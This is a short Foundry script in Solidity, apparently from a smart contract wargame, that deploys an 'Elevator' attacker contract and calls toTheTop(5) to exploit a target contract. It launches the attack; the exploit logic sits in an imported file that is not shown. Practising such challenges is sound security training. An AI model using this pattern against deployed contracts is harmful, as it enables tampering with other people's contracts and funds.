//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Building.sol";

contract DeployElevatorAttacker is Script {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);
        BuildingS buildingContract = new BuildingS();
        buildingContract.toTheTop(5);
        vm.stopBroadcast();
    }
}
